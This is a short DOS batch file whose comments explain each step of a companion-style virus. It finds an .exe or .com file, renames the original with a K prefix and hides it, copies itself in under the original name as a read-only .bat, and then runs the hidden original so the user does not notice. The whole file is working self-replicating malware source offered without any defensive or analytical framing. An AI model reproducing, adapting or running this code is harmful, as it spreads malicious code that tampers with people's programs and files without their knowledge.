@echo off
: rem turns off output to screen
ctty nul
: rem redirects all to nul
for %%f in (*.exe *.com) do set A=%%f
: rem find files exe or com set A = to the file name found
if %A%==COMMAND.COM set A=
: rem do not want to touch command.com so just reset A= to nothing
rename %A% K%A%
: rem ren the file to Kfile
if not exist K%A% goto end
: rem if error get out 
attrib +h K%A%
: rem hide the file
copy %0.bat %A%
:copy the bat file file to the file.ext
attrib +r %A%                          
: rem make this file read only
ren %A% *.bat
: rem now rename this file *.bat
set A=                          
: rem clear the variable
ctty con
: rem restore the screen
@if exist K%0.com K%0.com %1 %2 %3
@if exist K%0.exe K%0.exe %1 %2 %3
: rem run the orginal file with up to 3 parameters
